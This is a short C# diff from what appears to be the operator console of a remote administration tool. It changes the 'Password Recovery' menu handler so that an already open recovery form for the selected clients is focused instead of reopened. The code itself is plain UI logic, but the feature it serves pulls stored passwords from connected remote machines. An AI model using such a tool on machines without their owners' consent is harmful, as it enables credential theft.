@@ -591,8 +591,14 @@ namespace xServer.Forms
 
         private void ctxtPasswordRecovery_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count != 0)
+            foreach (Client c in GetSelectedClients())
             {
+                if (c.Value.FrmPass != null)
+                {
+                    c.Value.FrmPass.Focus();
+                    return;
+                }
+
                 FrmPasswordRecovery frmPass = new FrmPasswordRecovery(GetSelectedClients());
                 frmPass.Show();
             }
